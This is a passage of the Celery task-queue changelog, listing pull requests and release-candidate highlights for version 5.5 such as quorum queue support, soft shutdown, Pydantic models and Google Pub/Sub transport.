(#9133)\n\nBump mypy from 1.10.1 to 1.11.0 (#9135)\n\nUpdate cryptography to 43.0.0 (#9138)\n\nUpdate pytest to 8.3.1 (#9137)\n\nAdded support for Quorum Queues (#9121)\n\nBump Kombu to v5.4.0rc3 (#9139)\n\nCleanup in Changelog.rst (#9141)\n\nUpdate Django docs for CELERY_CACHE_BACKEND (#9143)\n\nAdded missing docs to previous releases (#9144)\n\nFixed a few documentation build warnings (#9145)\n\ndocs(README): link invalid (#9148)\n\nPrepare for (pre) release: v5.5.0b1 (#9146)\n\nBump pytest from 8.3.1 to 8.3.2 (#9153)\n\nRemove setuptools deprecated test command from setup.py (#9159)\n\nPin pre-commit to latest version 3.8.0 from Python 3.9 (#9156)\n\nBump mypy from 1.11.0 to 1.11.1 (#9164)\n\nChange “docker-compose” to “docker compose” in Makefile (#9169)\n\nupdate python versions and docker compose (#9171)\n\nAdd support for Pydantic model validation/serialization (fixes #8751) (#9023)\n\nAllow local dynamodb to be installed on another host than localhost (#8965)\n\nTerminate job implementation for gevent concurrency backend (#9083)\n\nBump Kombu to v5.4.0 (#9177)\n\nAdd check for soft_time_limit and time_limit values (#9173)\n\nPrepare for (pre) release: v5.5.0b2 (#9178)\n\nAdded SQS (localstack) broker to canvas smoke tests (#9179)\n\nPin elastic-transport to <= latest version 8.15.0 (#9182)\n\nUpdate elasticsearch requirement from <=8.14.0 to <=8.15.0 (#9186)\n\nimprove formatting (#9188)\n\nAdd basic helm chart for celery (#9181)\n\nUpdate kafka.rst (#9194)\n\nUpdate pytest-order to 1.3.0 (#9198)\n\nUpdate mypy to 1.11.2 (#9206)\n\nall added to routes (#9204)\n\nFix typos discovered by codespell (#9212)\n\nUse tzdata extras with zoneinfo backports (#8286)\n\nUse docker compose in Contributing’s doc build section (#9219)\n\nFailing test for issue #9119 (#9215)\n\nFix date_done timezone issue (#8385)\n\nCI Fixes to smoke tests (#9223)\n\nfix: passes current request context when pushing to request_stack (#9208)\n\nFix broken link in the Using RabbitMQ docs page (#9226)\n\nAdded Soft Shutdown Mechanism (#9213)\n\nAdded worker_enable_soft_shutdown_on_idle (#9231)\n\nBump cryptography from 43.0.0 to 43.0.1 (#9233)\n\nAdded docs regarding the relevancy of soft shutdown and ETA tasks (#9238)\n\nShow broker_connection_retry_on_startup warning only if it evaluates as False (#9227)\n\nFixed docker-docs CI failure (#9240)\n\nAdded docker cleanup auto-fixture to improve smoke tests stability (#9243)\n\nprint is not thread-safe, so should not be used in signal handler (#9222)\n\nPrepare for (pre) release: v5.5.0b3 (#9244)\n\nCorrect the error description in exception message when validate soft_time_limit (#9246)\n\nUpdate msgpack to 1.1.0 (#9249)\n\nchore(utils/time.py): rename _is_ambigious -> _is_ambiguous (#9248)\n\nReduced Smoke Tests to min/max supported python (3.8/3.12) (#9252)\n\nUpdate pytest to 8.3.3 (#9253)\n\nUpdate elasticsearch requirement from <=8.15.0 to <=8.15.1 (#9255)\n\nupdate mongodb without deprecated [srv] extra requirement (#9258)\n\nblacksmith.sh: Migrate workflows to Blacksmith (#9261)\n\nFixes #9119: inject dispatch_uid for retry-wrapped receivers (#9247)\n\nRun all smoke tests CI jobs together (#9263)\n\nImprove documentation on visibility timeout (#9264)\n\nBump pytest-celery to 1.1.2 (#9267)\n\nAdded missing “app.conf.visibility_timeout” in smoke tests (#9266)\n\nImproved stability with t/smoke/tests/test_consumer.py (#9268)\n\nImproved Redis container stability in the smoke tests (#9271)\n\nDisabled EXHAUST_MEMORY tests in Smoke-tasks (#9272)\n\nMarked xfail for test_reducing_prefetch_count with Redis - flaky test (#9273)\n\nFixed pypy unit tests random failures in the CI (#9275)\n\nFixed more pypy unit tests random failures in the CI (#9278)\n\nFix Redis container from aborting randomly (#9276)\n\nRun Integration & Smoke CI tests together after unit tests passes (#9280)\n\nAdded “loglevel verbose” to Redis containers in smoke tests (#9282)\n\nFixed Redis error in the smoke tests: “Possible SECURITY ATTACK detected” (#9284)\n\nRefactored the smoke tests github workflow (#9285)\n\nIncreased –reruns 3->4 in smoke tests (#9286)\n\nImprove stability of smoke tests (CI and Local) (#9287)\n\nFixed Smoke tests CI “test-case” lables (specific instead of general) (#9288)\n\nUse assert_log_exists instead of wait_for_log in worker smoke tests (#9290)\n\nOptimized t/smoke/tests/test_worker.py (#9291)\n\nEnable smoke tests dockers check before each test starts (#9292)\n\nRelaxed smoke tests flaky tests mechanism (#9293)\n\nUpdated quorum queue detection to handle multiple broker instances (#9294)\n\nNon-lazy table creation for database backend (#9228)\n\nPin pymongo to latest version 4.9 (#9297)\n\nBump pymongo from 4.9 to 4.9.1 (#9298)\n\nBump Kombu to v5.4.2 (#9304)\n\nUse rabbitmq:3 in stamping smoke tests (#9307)\n\nBump pytest-celery to 1.1.3 (#9308)\n\nAdded Python 3.13 Support (#9309)\n\nAdd log when global qos is disabled (#9296)\n\nAdded official release docs (whatsnew) for v5.5 (#9312)\n\nEnable Codespell autofix (#9313)\n\nPydantic typehints: Fix optional, allow generics (#9319)\n\nPrepare for (pre) release: v5.5.0b4 (#9322)\n\nAdded Blacksmith.sh to the Sponsors section in the README (#9323)\n\nRevert “Added Blacksmith.sh to the Sponsors section in the README” (#9324)\n\nAdded Blacksmith.sh to the Sponsors section in the README (#9325)\n\nAdded missing “ |oc-sponsor-3|” in README (#9326)\n\nUse Blacksmith SVG logo (#9327)\n\nUpdated Blacksmith SVG logo (#9328)\n\nRevert “Updated Blacksmith SVG logo” (#9329)\n\nUpdate pymongo to 4.10.0 (#9330)\n\nUpdate pymongo to 4.10.1 (#9332)\n\nUpdate user guide to recommend delay_on_commit (#9333)\n\nPin pre-commit to latest version 4.0.0 (Python 3.9+) (#9334)\n\nUpdate ephem to 4.1.6 (#9336)\n\nUpdated Blacksmith SVG logo (#9337)\n\nPrepare for (pre) release: v5.5.0rc1 (#9341)\n\nFix: Treat dbm.error as a corrupted schedule file (#9331)\n\nPin pre-commit to latest version 4.0.1 (#9343)\n\nAdded Python 3.13 to Dockerfiles (#9350)\n\nSkip test_pool_restart_import_modules on PyPy due to test issue (#9352)\n\nUpdate elastic-transport requirement from <=8.15.0 to <=8.15.1 (#9347)\n\nadded dragonfly logo (#9353)\n\nUpdate README.rst (#9354)\n\nUpdate README.rst (#9355)\n\nUpdate mypy to 1.12.0 (#9356)\n\nBump Kombu to v5.5.0rc1 (#9357)\n\nFix celery –loader option parsing (#9361)\n\nAdd support for Google Pub/Sub transport (#9351)\n\nAdd native incr support for GCSBackend (#9302)\n\nfix(perform_pending_operations): prevent task duplication on shutdown… (#9348)\n\nUpdate grpcio to 1.67.0 (#9365)\n\nUpdate google-cloud-firestore to 2.19.0 (#9364)\n\nAnnotate celery/utils/timer2.py (#9362)\n\nUpdate cryptography to 43.0.3 (#9366)\n\nUpdate mypy to 1.12.1 (#9368)\n\nBump mypy from 1.12.1 to 1.13.0 (#9373)\n\nPass timeout and confirm_timeout to producer.publish() (#9374)\n\nBump Kombu to v5.5.0rc2 (#9382)\n\nBump pytest-cov from 5.0.0 to 6.0.0 (#9388)\n\ndefault strict to False for pydantic tasks (#9393)\n\nOnly log that global QoS is disabled if using amqp (#9395)\n\nchore: update sponsorship logo (#9398)\n\nAllow custom hostname for celery_worker in celery.contrib.pytest / celery.contrib.testing.worker (#9405)\n\nRemoved docker-docs from CI (optional job, malfunctioning) (#9406)\n\nAdded a utility to format changelogs from the auto-generated GitHub release notes (#9408)\n\nBump codecov/codecov-action from 4 to 5 (#9412)\n\nUpdate elasticsearch requirement from <=8.15.1 to <=8.16.0 (#9410)\n\nNative Delayed Delivery in RabbitMQ (#9207)\n\nPrepare for (pre) release: v5.5.0rc2 (#9416)\n\nDocument usage of broker_native_delayed_delivery_queue_type (#9419)\n\nAdjust section in what’s new document regarding quorum queues support (#9420)\n\nUpdate pytest-rerunfailures to 15.0 (#9422)\n\nDocument group unrolling (#9421)\n\nfix small typo acces -> access (#9434)\n\nUpdate cryptography to 44.0.0 (#9437)\n\nAdded pypy to Dockerfile (#9438)\n\nSkipped flaky tests on pypy (all pass after ~10 reruns) (#9439)\n\nAllowing managed credentials for azureblockblob (#9430)\n\nAllow passing Celery objects to the Click entry point (#9426)\n\nsupport Request termination for gevent (#9440)\n\nPrevent event_mask from being overwritten. (#9432)\n\nUpdate pytest to 8.3.4 (#9444)\n\nPrepare for (pre) release: v5.5.0rc3 (#9450)\n\nBugfix: SIGQUIT not initiating cold shutdown when task_acks_late=False (#9461)\n\nFixed pycurl dep with Python 3.8 (#9471)\n\nUpdate elasticsearch requirement from <=8.16.0 to <=8.17.0 (#9469)\n\nBump pytest-subtests from 0.13.1 to 0.14.1 (#9459)\n\ndocumentation: Added a type annotation to the periodic task example (#9473)\n\nPrepare for (pre) release: v5.5.0rc4 (#9474)\n\nBump mypy from 1.13.0 to 1.14.0 (#9476)\n\nFix cassandra backend port settings not working (#9465)\n\nUnroll group when a group with a single item is chained using the | operator (#9456)\n\nfix(django): catch the right error when trying to close db connection (#9392)\n\nReplacing a task with a chain which contains a group now returns a result instead of hanging (#9484)\n\nAvoid using a group of one as it is now unrolled into a chain (#9510)\n\nLink to the correct IRC network (#9509)\n\nBump pytest-github-actions-annotate-failures from 0.2.0 to 0.3.0 (#9504)\n\nUpdate canvas.rst to fix output result from chain object (#9502)\n\nUnauthorized Changes Cleanup (#9528)\n\n[RE-APPROVED] fix(django): catch the right error when trying to close db connection (#9529)\n\n[RE-APPROVED] Link to the correct IRC network (#9531)\n\n[RE-APPROVED] Update canvas.rst to fix output result from chain object (#9532)\n\nUpdate test-ci-base.txt (#9539)\n\nUpdate install-pyenv.sh (#9540)\n\nUpdate elasticsearch requirement from <=8.17.0 to <=8.17.1 (#9518)\n\nBump google-cloud-firestore from 2.19.0 to 2.20.0 (#9493)\n\nBump mypy from 1.14.0 to 1.14.1 (#9483)\n\nUpdate elastic-transport requirement from <=8.15.1 to <=8.17.0 (#9490)\n\nUpdate Dockerfile by adding missing Python version 3.13 (#9549)\n\nFix typo for default of sig (#9495)\n\nfix(crontab): resolve constructor type conflicts (#9551)\n\nworker_max_memory_per_child: kilobyte is 1024 bytes (#9553)\n\nFix formatting in quorum queue docs (#9555)\n\nBump cryptography from 44.0.0 to 44.0.1 (#9556)\n\nFix the send_task method when detecting if the native delayed delivery approach is available (#9552)\n\nReverted PR #7814 & minor code improvement (#9494)\n\nImproved donation and sponsorship visibility (#9558)\n\nUpdated the Getting Help section, replacing deprecated with new resources (#9559)\n\nFixed django example (#9562)\n\nBump Kombu to v5.5.0rc3 (#9564)\n\nBump ephem from 4.1.6 to 4.2 (#9565)\n\nBump pytest-celery to v1.2.0 (#9568)\n\nRemove dependency on pycurl (#9526)\n\nSet TestWorkController.__test__ (#9574)\n\nFixed bug when revoking by stamped headers a stamp that does not exist (#9575)\n\nCanvas Stamping Doc Fixes (#9578)\n\nBugfix: Chord with a chord in header doesn’t invoke error callback on inner chord header failure (default config) (#9580)\n\nPrepare for (pre) release: v5.5.0rc5 (#9582)\n\nBump google-cloud-firestore from 2.20.0 to 2.20.1 (#9584)\n\nFix tests with Click 8.2 (#9590)\n\nBump cryptography from 44.0.1 to 44.0.2 (#9591)\n\nUpdate elasticsearch requirement from <=8.17.1 to <=8.17.2 (#9594)\n\nBump pytest from 8.3.4 to 8.3.5 (#9598)\n\nRefactored and Enhanced DelayedDelivery bootstep (#9599)\n\nImprove docs about acks_on_failure_or_timeout (#9577)\n\nUpdate SECURITY.md (#9609)\n\nremove flake8plus as not needed anymore (#9610)\n\nremove [bdist_wheel] universal = 0 from setup.cfg as not needed (#9611)\n\nremove importlib-metadata as not needed in python3.8 anymore (#9612)\n\nfeat: define exception_safe_to_retry for redisbackend (#9614)\n\nBump Kombu to v5.5.0 (#9615)\n\nUpdate elastic-transport requirement from <=8.17.0 to <=8.17.1 (#9616)\n\n[docs] fix first-steps (#9618)\n\nRevert “Improve docs about acks_on_failure_or_timeout” (#9606)\n\nImprove CI stability and performance (#9624)\n\nImproved explanation for Database transactions at user guide for tasks (#9617)\n\nupdate tests to use python 3.8 codes only (#9627)\n\n#9597: Ensure surpassing Hard Timeout limit when task_acks_on_failure_or_timeout is False rejects the task (#9626)\n\nLock Kombu to v5.5.x (using urllib3 instead of pycurl) (#9632)\n\nLock pytest-celery to v1.2.x (using urllib3 instead of pycurl) (#9633)\n\nAdd Codecov Test Analytics (#9635)\n\nBump Kombu to v5.5.2 (#9643)\n\nPrepare for release: v5.5.0 (#9644)\n\n5.5.0rc5\nrelease-date:\n\n2025-02-25\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.5.0 Release Candidate 5 is now available for testing. Please help us test this version and report any issues.\n\nKey Highlights\n\nSee What’s new in Celery 5.5 (Immunity) or read the main highlights below.\n\nUsing Kombu 5.5.0rc3\n\nThe minimum required Kombu version has been bumped to 5.5.0. Kombu is currently at 5.5.0rc3.\n\nComplete Quorum Queues Support\n\nA completely new ETA mechanism was developed to allow full support with RabbitMQ Quorum Queues.\n\nAfter upgrading to this version, please share your feedback on the quorum queues support.\n\nRelevant Issues: #9207, #6067\n\nNew documentation.\n\nNew broker_native_delayed_delivery_queue_type configuration option.\n\nNew support for Google Pub/Sub transport\n\nAfter upgrading to this version, please share your feedback on the Google Pub/Sub transport support.\n\nRelevant Issues: #9351\n\nPython 3.13 Improved Support\n\nAdditional dependencies have been migrated successfully to Python 3.13, including Kombu and py-amqp.\n\nSoft Shutdown\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited “warm shutdown” period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option worker_soft_shutdown_timeout. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option worker_enable_soft_shutdown_on_idle is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like Redis or SQS, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., Restoring 1 unacknowledged message(s)) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues: #9213, #9231, #9238\n\nNew documentation for each shutdown type.\n\nNew worker_soft_shutdown_timeout configuration option.\n\nNew worker_enable_soft_shutdown_on_idle configuration option.\n\nREMAP_SIGTERM\n\nThe REMAP_SIGTERM “hidden feature” has been tested, documented and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using TERM instead of QUIT.\n\nPydantic Support\n\nThis release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR #9023 by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n\nThe root cause of the Redis broker instability issue has been identified and resolved in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues: #7276, #8091, #8030, #8384\n\nQuorum Queues Initial Support\n\nThis release introduces the initial support for Quorum Queues with Celery.\n\nSee new configuration options for more details:\n\ntask_default_queue_type\n\nworker_detect_quorum_queues\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues: #6067, #9121\n\nWhat’s Changed\n\nBump mypy from 1.13.0 to 1.14.0 (#9476)\n\nFix cassandra backend port settings not working (#9465)\n\nUnroll group when a group with a single item is chained using the | operator (#9456)\n\nfix(django): catch the right error when trying to close db connection (#9392)\n\nReplacing a task with a chain which contains a group now returns a result instead of hanging (#9484)\n\nAvoid using a group of one as it is now unrolled into a chain (#9510)\n\nLink to the correct IRC network (#9509)\n\nBump pytest-github-actions-annotate-failures from 0.2.0 to 0.3.0 (#9504)\n\nUpdate canvas.rst to fix output result from chain object (#9502)\n\nUnauthorized Changes Cleanup (#9528)\n\n[RE-APPROVED] fix(django): catch the right error when trying to close db connection (#9529)\n\n[RE-APPROVED] Link to the correct IRC network (#9531)\n\n[RE-APPROVED] Update canvas.rst to fix output result from chain object (#9532)\n\nUpdate test-ci-base.txt (#9539)\n\nUpdate install-pyenv.sh (#9540)\n\nUpdate elasticsearch requirement from <=8.17.0 to <=8.17.1 (#9518)\n\nBump google-cloud-firestore from 2.19.0 to 2.20.0 (#9493)\n\nBump mypy from 1.14.0 to 1.14.1 (#9483)\n\nUpdate elastic-transport requirement from <=8.15.1 to <=8.17.0 (#9490)\n\nUpdate Dockerfile by adding missing Python version 3.13 (#9549)\n\nFix typo for default of sig (#9495)\n\nfix(crontab): resolve constructor type conflicts (#9551)\n\nworker_max_memory_per_child: kilobyte is 1024 bytes (#9553)\n\nFix formatting in quorum queue docs (#9555)\n\nBump cryptography from 44.0.0 to 44.0.1 (#9556)\n\nFix the send_task method when detecting if the native delayed delivery approach is available (#9552)\n\nReverted PR #7814 & minor code improvement (#9494)\n\nImproved donation and sponsorship visibility (#9558)\n\nUpdated the Getting Help section, replacing deprecated with new resources (#9559)\n\nFixed django example (#9562)\n\nBump Kombu to v5.5.0rc3 (#9564)\n\nBump ephem from 4.1.6 to 4.2 (#9565)\n\nBump pytest-celery to v1.2.0 (#9568)\n\nRemove dependency on pycurl (#9526)\n\nSet TestWorkController.__test__ (#9574)\n\nFixed bug when revoking by stamped headers a stamp that does not exist (#9575)\n\nCanvas Stamping Doc Fixes (#9578)\n\nBugfix: Chord with a chord in header doesn’t invoke error callback on inner chord header failure (default config) (#9580)\n\nPrepare for (pre) release: v5.5.0rc5 (#9582)\n\n5.5.0rc4\nrelease-date:\n\n2024-12-19\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.5.0 Release Candidate 4 is now available for testing. Please help us test this version and report any issues.\n\nKey Highlights\n\nSee What’s new in Celery 5.5 (Immunity) or read the main highlights below.\n\nUsing Kombu 5.5.0rc2\n\nThe minimum required Kombu version has been bumped to 5.5.0. Kombu is current at 5.5.0rc2.\n\nComplete Quorum Queues Support\n\nA completely new ETA mechanism was developed to allow full support with RabbitMQ Quorum Queues.\n\nAfter upgrading to this version, please share your feedback on the quorum queues support.\n\nRelevant Issues: #9207, #6067\n\nNew documentation.\n\nNew broker_native_delayed_delivery_queue_type configuration option.\n\nNew support for Google Pub/Sub transport\n\nAfter upgrading to this version, please share your feedback on the Google Pub/Sub transport support.\n\nRelevant Issues: #9351\n\nPython 3.13 Improved Support\n\nAdditional dependencies have been migrated successfully to Python 3.13, including Kombu and py-amqp.\n\nSoft Shutdown\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited “warm shutdown” period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option worker_soft_shutdown_timeout. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option worker_enable_soft_shutdown_on_idle is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like Redis or SQS, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., Restoring 1 unacknowledged message(s)) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues: #9213, #9231, #9238\n\nNew documentation for each shutdown type.\n\nNew worker_soft_shutdown_timeout configuration option.\n\nNew worker_enable_soft_shutdown_on_idle configuration option.\n\nREMAP_SIGTERM\n\nThe REMAP_SIGTERM “hidden feature” has been tested, documented and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using TERM instead of QUIT.\n\nPydantic Support\n\nThis release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR #9023 by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n\nThe root cause of the Redis broker instability issue has been identified and resolved in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues: #7276, #8091, #8030, #8384\n\nQuorum Queues Initial Support\n\nThis release introduces the initial support for Quorum Queues with Celery.\n\nSee new configuration options for more details:\n\ntask_default_queue_type\n\nworker_detect_quorum_queues\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues: #6067, #9121\n\nWhat’s Changed\n\nBugfix: SIGQUIT not initiating cold shutdown when task_acks_late=False (#9461)\n\nFixed pycurl dep with Python 3.8 (#9471)\n\nUpdate elasticsearch requirement from <=8.16.0 to <=8.17.0 (#9469)\n\nBump pytest-subtests from 0.13.1 to 0.14.1 (#9459)\n\ndocumentation: Added a type annotation to the periodic task example (#9473)\n\nPrepare for (pre) release: v5.5.0rc4 (#9474)\n\n5.5.0rc3\nrelease-date:\n\n2024-12-03\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.5.0 Release Candidate 3 is now available for testing. Please help us test this version and report any issues.\n\nKey Highlights\n\nSee What’s new in Celery 5.5 (Immunity) or read the main highlights below.\n\nUsing Kombu 5.5.0rc2\n\nThe minimum required Kombu version has been bumped to 5.5.0. Kombu is current at 5.5.0rc2.\n\nComplete Quorum Queues Support\n\nA completely new ETA mechanism was developed to allow full support with RabbitMQ Quorum Queues.\n\nAfter upgrading to this version, please share your feedback on the quorum queues support.\n\nRelevant Issues: #9207, #6067\n\nNew documentation.\n\nNew broker_native_delayed_delivery_queue_type configuration option.\n\nNew support for Google Pub/Sub transport\n\nAfter upgrading to this version, please share your feedback on the Google Pub/Sub transport support.\n\nRelevant Issues: #9351\n\nPython 3.13 Improved Support\n\nAdditional dependencies have been migrated successfully to Python 3.13, including Kombu and py-amqp.\n\nSoft Shutdown\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited “warm shutdown” period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option worker_soft_shutdown_timeout. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option worker_enable_soft_shutdown_on_idle is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like Redis or SQS, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., Restoring 1 unacknowledged message(s)) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues: #9213, #9231, #9238\n\nNew documentation for each shutdown type.\n\nNew worker_soft_shutdown_timeout configuration option.\n\nNew worker_enable_soft_shutdown_on_idle configuration option.\n\nREMAP_SIGTERM\n\nThe REMAP_SIGTERM “hidden feature” has been tested, documented and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using TERM instead of QUIT.\n\nPydantic Support\n\nThis release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR #9023 by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n\nThe root cause of the Redis broker instability issue has been identified and resolved in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues: #7276, #8091, #8030, #8384\n\nQuorum Queues Initial Support\n\nThis release introduces the initial support for Quorum Queues with Celery.\n\nSee new configuration options for more details:\n\ntask_default_queue_type\n\nworker_detect_quorum_queues\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues: #6067, #9121\n\nWhat’s Changed\n\nDocument usage of broker_native_delayed_delivery_queue_type (#9419)\n\nAdjust section in what’s new document regarding quorum queues support (#9420)\n\nUpdate pytest-rerunfailures to 15.0 (#9422)\n\nDocument group unrolling (#9421)\n\nfix small typo acces -> access (#9434)\n\nUpdate cryptography to 44.0.0 (#9437)\n\nAdded pypy to Dockerfile (#9438)\n\nSkipped flaky tests on pypy (all pass after ~10 reruns) (#9439)\n\nAllowing managed credentials for azureblockblob (#9430)\n\nAllow passing Celery objects to the Click entry point (#9426)\n\nsupport Request termination for gevent (#9440)\n\nPrevent event_mask from being overwritten. (#9432)\n\nUpdate pytest to 8.3.4 (#9444)\n\nPrepare for (pre) release: v5.5.0rc3 (#9450)\n\n5.5.0rc2\nrelease-date:\n\n2024-11-18\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.5.0 Release Candidate 2 is now available for testing. Please help us test this version and report any issues.\n\nKey Highlights\n\nSee What’s new in Celery 5.5 (Immunity) or read the main highlights below.\n\nUsing Kombu 5.5.0rc2\n\nThe minimum required Kombu version has been bumped to 5.5.0. Kombu is current at 5.5.0rc2.\n\nComplete Quorum Queues Support\n\nA completely new ETA mechanism was developed to allow full support with RabbitMQ Quorum Queues.\n\nAfter upgrading to this version, please share your feedback on the quorum queues support.\n\nRelevant Issues: #9207, #6067\n\nNew documentation.\n\nNew broker_native_delayed_delivery_queue_type configuration option.\n\nNew support for Google Pub/Sub transport\n\nAfter upgrading to this version, please share your feedback on the Google Pub/Sub transport support.\n\nRelevant Issues: #9351\n\nPython 3.13 Improved Support\n\nAdditional dependencies have been migrated successfully to Python 3.13, including Kombu and py-amqp.\n\nPrevious Pre-release Highlights\nPython 3.13 Initial Support\n\nThis release introduces the initial support for Python 3.13 with Celery.\n\nAfter upgrading to this version, please share your feedback on the Python 3.13 support.\n\nSoft Shutdown\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited “warm shutdown” period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option worker_soft_shutdown_timeout. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option worker_enable_soft_shutdown_on_idle is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like Redis or SQS, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., Restoring 1 unacknowledged message(s)) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues: #9213, #9231, #9238\n\nNew documentation for each shutdown type.\n\nNew worker_soft_shutdown_timeout configuration option.\n\nNew worker_enable_soft_shutdown_on_idle configuration option.\n\nREMAP_SIGTERM\n\nThe REMAP_SIGTERM “hidden feature” has been tested, documented and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using TERM instead of QUIT.\n\nPydantic Support\n\nThis release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR #9023 by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n\nThe root cause of the Redis broker instability issue has been identified and resolved in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues: #7276, #8091, #8030, #8384\n\nQuorum Queues Initial Support\n\nThis release introduces the initial support for Quorum Queues with Celery.\n\nSee new configuration options for more details:\n\ntask_default_queue_type\n\nworker_detect_quorum_queues\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues: #6067, #9121\n\nWhat’s Changed\n\nFix: Treat dbm.error as a corrupted schedule file (#9331)\n\nPin pre-commit to latest version 4.0.1 (#9343)\n\nAdded Python 3.13 to Dockerfiles (#9350)\n\nSkip test_pool_restart_import_modules on PyPy due to test issue (#9352)\n\nUpdate elastic-transport requirement from <=8.15.0 to <=8.15.1 (#9347)\n\nadded dragonfly logo (#9353)\n\nUpdate README.rst (#9354)\n\nUpdate README.rst (#9355)\n\nUpdate mypy to 1.12.0 (#9356)\n\nBump Kombu to v5.5.0rc1 (#9357)\n\nFix celery –loader option parsing (#9361)\n\nAdd support for Google Pub/Sub transport (#9351)\n\nAdd native incr support for GCSBackend (#9302)\n\nfix(perform_pending_operations): prevent task duplication on shutdown… (#9348)\n\nUpdate grpcio to 1.67.0 (#9365)\n\nUpdate google-cloud-firestore to 2.19.0 (#9364)\n\nAnnotate celery/utils/timer2.py (#9362)\n\nUpdate cryptography to 43.0.3 (#9366)\n\nUpdate mypy to 1.12.1 (#9368)\n\nBump mypy from 1.12.1 to 1.13.0 (#9373)\n\nPass timeout and confirm_timeout to producer.publish() (#9374)\n\nBump Kombu to v5.5.0rc2 (#9382)\n\nBump pytest-cov from 5.0.0 to 6.0.0 (#9388)\n\ndefault strict to False for pydantic tasks (#9393)\n\nOnly log that global QoS is disabled if using amqp (#9395)\n\nchore: update sponsorship logo (#9398)\n\nAllow custom hostname for celery_worker in celery.contrib.pytest / celery.contrib.testing.worker (#9405)\n\nRemoved docker-docs from CI (optional job, malfunctioning) (#9406)\n\nAdded a utility to format changelogs from the 